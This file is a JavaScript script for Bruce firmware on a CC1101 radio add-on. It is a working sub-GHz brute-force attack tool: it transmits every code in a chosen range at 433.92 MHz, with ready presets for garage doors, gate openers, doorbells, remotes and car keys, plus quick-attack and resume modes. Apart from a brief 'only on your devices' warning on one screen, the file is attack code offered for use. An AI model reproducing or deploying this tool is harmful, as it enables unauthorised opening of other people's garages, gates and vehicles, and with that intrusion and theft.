var display = require('display');
var keyboardApi = require('keyboard');
var dialog = require('dialog');
var subghz = require('subghz');

// Display functions
var fillScreen = display.fill;
var drawString = display.drawString;

// Input functions
var getAnyPress = keyboardApi.getAnyPress;
var keyboardPrompt = keyboardApi.keyboard;

// Dialog functions
var dialogChoice = dialog.choice;
var dialogError = dialog.error;
var dialogMessage = dialog.message;

// SubGHz transmit (NM-RF HAT / CC1101)
var subghzTransmit = subghz.transmit;

// Brute force presets for common devices
var presets = {
    garage_8bit: {
        name: "Garage Door (8-bit)",
        prefix: 0x445700,
        bits: 8,
        frequency: 433920000,
        te: 174,
        repeat: 10,
        delay_ms: 200
    },
    garage_12bit: {
        name: "Garage Door (12-bit)",
        prefix: 0x445700,
        bits: 12,
        frequency: 433920000,
        te: 174,
        repeat: 8,
        delay_ms: 150
    },
    gate_16bit: {
        name: "Gate Opener (16-bit)",
        prefix: 0x440000,
        bits: 16,
        frequency: 433920000,
        te: 200,
        repeat: 8,
        delay_ms: 100
    },
    doorbell_10bit: {
        name: "Doorbell (10-bit)",
        prefix: 0x123400,
        bits: 10,
        frequency: 433920000,
        te: 350,
        repeat: 15,
        delay_ms: 250
    },
    remote_24bit: {
        name: "Remote Control (24-bit)",
        prefix: 0xA00000,
        bits: 24,
        frequency: 433920000,
        te: 320,
        repeat: 5,
        delay_ms: 50
    },
    car_key_20bit: {
        name: "Car Key (20-bit)",
        prefix: 0x100000,
        bits: 20,
        frequency: 433920000,
        te: 174,
        repeat: 6,
        delay_ms: 80
    }
};

// Current brute force configuration
var config = {
    prefix: 0x445700,
    bits: 8,
    frequency: 433920000,
    te: 174,
    repeat: 10,
    delay_ms: 200,
    start_value: 0,  // For resume functionality
    reverse: false   // Brute force in reverse
};

// Statistics
var stats = {
    total_sent: 0,
    failed_count: 0,
    start_time: 0,
    elapsed_time: 0
};

// Calculate total values and estimated time
function calculateStats() {
    var total = (1 << config.bits);
    var time_sec = Math.floor((total * config.delay_ms) / 1000);
    return {
        total: total,
        time_sec: time_sec,
        time_min: Math.floor(time_sec / 60),
        time_hour: Math.floor(time_sec / 3600)
    };
}

// Display time estimate
function formatTime(seconds) {
    if (seconds < 60) {
        return String(seconds) + "s";
    } else if (seconds < 3600) {
        return String(Math.floor(seconds / 60)) + "m " + String(seconds % 60) + "s";
    } else {
        var hours = Math.floor(seconds / 3600);
        var mins = Math.floor((seconds % 3600) / 60);
        return String(hours) + "h " + String(mins) + "m";
    }
}

// Main brute force attack function
function bruteForceAttack() {
    var max_val = config.prefix + (1 << config.bits);
    var start_val = config.prefix + config.start_value;
    var total = (1 << config.bits);
    var count = config.start_value;
    
    stats.total_sent = 0;
    stats.failed_count = 0;
    stats.start_time = Date.now();
    
    fillScreen(0);
    drawString("=== BRUTE FORCE ATTACK ===", 3, 0);
    drawString("Target: " + (config.frequency / 1000000).toFixed(2) + " MHz", 3, 16);
    drawString("Values: " + total, 3, 32);
    drawString("Est. time: " + formatTime(calculateStats().time_sec), 3, 48);
    drawString("", 3, 64);
    drawString("Starting in 3 seconds...", 3, 80);
    drawString("HOLD ANY KEY TO STOP", 3, 96);
    delay(3000);
    
    // Determine iteration direction
    var increment = config.reverse ? -1 : 1;
    var brute_val = config.reverse ? (max_val - 1) : start_val;
    var condition = config.reverse ? 
        function(v) { return v >= config.prefix; } : 
        function(v) { return v < max_val; };
    
    while (condition(brute_val)) {
        fillScreen(0);
        var curr_val = brute_val.toString(16).toUpperCase();
        
        count++;
        stats.total_sent++;
        var percent = Math.floor((count / total) * 100);
        stats.elapsed_time = Math.floor((Date.now() - stats.start_time) / 1000);
        
        // Calculate remaining time
        var avg_time_per_val = stats.elapsed_time / count;
        var remaining_vals = total - count;
        var remaining_time = Math.floor(avg_time_per_val * remaining_vals);
        
        // Display current status
        drawString("TRANSMITTING " + count + "/" + total, 3, 0);
        drawString("Progress: " + percent + "%", 3, 12);
        drawString("", 3, 24);
        drawString("Value: 0x" + curr_val, 3, 36);
        drawString("Freq: " + (config.frequency / 1000000).toFixed(2) + " MHz", 3, 48);
        drawString("TE: " + config.te + " | Rep: " + config.repeat, 3, 60);
        drawString("", 3, 72);
        drawString("Time: " + formatTime(stats.elapsed_time) + " / " + formatTime(remaining_time), 3, 84);
        drawString("Failed: " + stats.failed_count, 3, 96);
        drawString("", 3, 108);
        drawString("HOLD ANY KEY TO STOP", 3, 120);
        
        // Check for stop signal
        if (getAnyPress()) {
            fillScreen(0);
            drawString("ATTACK STOPPED", 3, 0);
            drawString("", 3, 16);
            drawString("Sent: " + stats.total_sent, 3, 32);
            drawString("Failed: " + stats.failed_count, 3, 48);
            drawString("Time: " + formatTime(stats.elapsed_time), 3, 64);
            drawString("", 3, 80);
            drawString("Last value: 0x" + curr_val, 3, 96);
            drawString("", 3, 112);
            drawString("Press any key...", 3, 128);
            
            // Update start_value for resume
            config.start_value = count;
            
            while (!getAnyPress()) {
                delay(100);
            }
            return false;
        }
        
        // Transmit the current value
        var result = subghzTransmit(curr_val, config.frequency, config.te, config.repeat);
        
        if (!result) {
            stats.failed_count++;
            
            // Show error every 10 failures
            if (stats.failed_count % 10 === 0) {
                fillScreen(0);
                drawString("TRANSMISSION ERRORS!", 3, 0);
                drawString("Failed count: " + stats.failed_count, 3, 16);
                drawString("Last failed: 0x" + curr_val, 3, 32);
                drawString("", 3, 48);
                drawString("Check NM-RF HAT connection", 3, 64);
                drawString("", 3, 80);
                drawString("Continue? Press key...", 3, 96);
                delay(2000);
                
                if (getAnyPress()) {
                    return false;
                }
            }
        }
        
        delay(config.delay_ms);
        brute_val += increment;
    }
    
    // Attack complete
    fillScreen(0);
    drawString("=== ATTACK COMPLETE ===", 3, 0);
    drawString("", 3, 16);
    drawString("Total sent: " + stats.total_sent, 3, 32);
    drawString("Failed: " + stats.failed_count, 3, 48);
    drawString("Success rate: " + Math.floor(((stats.total_sent - stats.failed_count) / stats.total_sent) * 100) + "%", 3, 64);
    drawString("Time elapsed: " + formatTime(stats.elapsed_time), 3, 80);
    drawString("", 3, 96);
    drawString("Press any key...", 3, 112);
    
    config.start_value = 0;  // Reset for next run
    
    while (!getAnyPress()) {
        delay(100);
    }
    
    return true;
}

// Load preset configuration
function loadPreset() {
    var options = {};
    options["=== PRESETS ==="] = "header";
    
    var preset_keys = ["garage_8bit", "garage_12bit", "gate_16bit", "doorbell_10bit", "remote_24bit", "car_key_20bit"];
    
    for (var i = 0; i < preset_keys.length; i++) {
        var key = preset_keys[i];
        var preset = presets[key];
        options[preset.name] = key;
    }
    
    options["Back"] = "back";
    
    var choice = dialogChoice(options);
    
    if (choice !== "" && choice !== "back") {
        var preset = presets[choice];
        config.prefix = preset.prefix;
        config.bits = preset.bits;
        config.frequency = preset.frequency;
        config.te = preset.te;
        config.repeat = preset.repeat;
        config.delay_ms = preset.delay_ms;
        config.start_value = 0;
        
        dialogMessage("Preset loaded: " + preset.name);
    }
}

// Advanced settings
function advancedSettings() {
    while (true) {
        var options = {};
        options["=== ADVANCED ==="] = "header";
        options["Reverse Direction: " + (config.reverse ? "ON" : "OFF")] = "reverse";
        options["Start Value: " + config.start_value] = "start_val";
        options["Reset Start Value"] = "reset_start";
        options["Test Single Value"] = "test_single";
        options["Back"] = "back";
        
        var choice = dialogChoice(options);
        
        if (choice === "" || choice === "back") break;
        else if (choice === "reverse") {
            config.reverse = !config.reverse;
        }
        else if (choice === "start_val") {
            var input = keyboardPrompt(String(config.start_value), 32, "Start value offset");
            if (input) {
                var val = parseInt(input);
                if (val >= 0 && val < (1 << config.bits)) {
                    config.start_value = val;
                } else {
                    dialogError("Invalid range");
                }
            }
        }
        else if (choice === "reset_start") {
            config.start_value = 0;
            dialogMessage("Start value reset");
        }
        else if (choice === "test_single") {
            var test_hex = keyboardPrompt("", 32, "Test value (hex)");
            if (test_hex && test_hex !== "") {
                fillScreen(0);
                drawString("Testing: 0x" + test_hex, 3, 0);
                drawString("Freq: " + (config.frequency / 1000000).toFixed(2) + " MHz", 3, 16);
                drawString("TE: " + config.te, 3, 32);
                
                var result = subghzTransmit(test_hex, config.frequency, config.te, config.repeat);
                
                if (result) {
                    dialogMessage("Test successful!");
                } else {
                    dialogError("Test failed!");
                }
            }
        }
    }
}

// Main configuration menu
function configMenu() {
    while (true) {
        var calc = calculateStats();
        
        var options = {};
        options["=== CONFIGURATION ==="] = "header";
        options["Prefix: 0x" + config.prefix.toString(16).toUpperCase()] = "prefix";
        options["Range: " + config.bits + " bits (" + calc.total + " values)"] = "bits";
        options["Frequency: " + (config.frequency / 1000000).toFixed(2) + " MHz"] = "freq";
        options["TE: " + config.te + " μs"] = "te";
        options["Repeat: " + config.repeat] = "repeat";
        options["Delay: " + config.delay_ms + " ms"] = "delay";
        options["---"] = "separator";
        options["Est. Time: " + formatTime(calc.time_sec)] = "time_info";
        options["Load Preset"] = "preset";
        options["Advanced"] = "advanced";
        options["--- START ATTACK ---"] = "start";
        options["Back"] = "back";
        
        var choice = dialogChoice(options);
        
        if (choice === "" || choice === "back") break;
        else if (choice === "prefix") {
            var input = keyboardPrompt(config.prefix.toString(16), 32, "Prefix (hex)");
            if (input) config.prefix = parseInt(input, 16);
        }
        else if (choice === "bits") {
            var input = keyboardPrompt(String(config.bits), 32, "Bits (1-24)");
            if (input) {
                var bits = parseInt(input);
                if (bits >= 1 && bits <= 24) {
                    config.bits = bits;
                    config.start_value = 0;
                } else {
                    dialogError("Bits must be 1-24");
                }
            }
        }
        else if (choice === "freq") {
            var input = keyboardPrompt(String(config.frequency / 1000000), 32, "Freq (MHz)");
            if (input) config.frequency = parseInt(parseFloat(input) * 1000000);
        }
        else if (choice === "te") {
            var input = keyboardPrompt(String(config.te), 32, "TE (μs)");
            if (input) config.te = parseInt(input);
        }
        else if (choice === "repeat") {
            var input = keyboardPrompt(String(config.repeat), 32, "Repeat count");
            if (input) config.repeat = parseInt(input);
        }
        else if (choice === "delay") {
            var input = keyboardPrompt(String(config.delay_ms), 32, "Delay (ms)");
            if (input) config.delay_ms = parseInt(input);
        }
        else if (choice === "preset") {
            loadPreset();
        }
        else if (choice === "advanced") {
            advancedSettings();
        }
        else if (choice === "start") {
            // Confirmation screen
            fillScreen(0);
            drawString("=== READY TO ATTACK ===", 3, 0);
            drawString("", 3, 16);
            drawString("Prefix: 0x" + config.prefix.toString(16).toUpperCase(), 3, 32);
            drawString("Range: " + calc.total + " values", 3, 48);
            drawString("Freq: " + (config.frequency / 1000000).toFixed(2) + " MHz", 3, 64);
            drawString("Time: ~" + formatTime(calc.time_sec), 3, 80);
            drawString("", 3, 96);
            drawString("WARNING: Use responsibly!", 3, 112);
            drawString("Only on YOUR devices!", 3, 128);
            drawString("", 3, 144);
            drawString("Press any key to START", 3, 160);
            
            while (!getAnyPress()) {
                delay(100);
            }
            
            bruteForceAttack();
        }
    }
}

// Information screen
function infoScreen() {
    fillScreen(0);
    drawString("=== NM-RF HAT BRUTE ===", 3, 0);
    drawString("", 3, 16);
    drawString("Hardware:", 3, 32);
    drawString("- CYD-2432S028", 3, 48);
    drawString("- NM-RF HAT (CC1101)", 3, 64);
    drawString("- Bruce Firmware", 3, 80);
    drawString("", 3, 96);
    drawString("Features:", 3, 112);
    drawString("- Preset configurations", 3, 128);
    drawString("- Resume capability", 3, 144);
    drawString("- Progress tracking", 3, 160);
    drawString("", 3, 176);
    drawString("Press any key...", 3, 192);
    
    while (!getAnyPress()) {
        delay(100);
    }
}

// Main menu
function mainMenu() {
    infoScreen();
    
    while (true) {
        var options = {};
        options["=== RF BRUTE FORCE ==="] = "header";
        options["Configure & Attack"] = "config";
        options["Quick 8-bit Attack"] = "quick8";
        options["Quick 12-bit Attack"] = "quick12";
        options["Information"] = "info";
        options["Exit"] = "exit";
        
        var choice = dialogChoice(options);
        
        if (choice === "" || choice === "exit") {
            break;
        }
        else if (choice === "config") {
            configMenu();
        }
        else if (choice === "quick8") {
            // Quick 8-bit attack with defaults
            config.prefix = 0x445700;
            config.bits = 8;
            config.frequency = 433920000;
            config.te = 174;
            config.repeat = 10;
            config.delay_ms = 200;
            config.start_value = 0;
            
            bruteForceAttack();
        }
        else if (choice === "quick12") {
            // Quick 12-bit attack
            config.prefix = 0x445700;
            config.bits = 12;
            config.frequency = 433920000;
            config.te = 174;
            config.repeat = 8;
            config.delay_ms = 150;
            config.start_value = 0;
            
            bruteForceAttack();
        }
        else if (choice === "info") {
            infoScreen();
        }
    }
    
    fillScreen(0);
    drawString("RF Brute Force closed", 3, 0);
    delay(1000);
}

// Start the application
mainMenu();
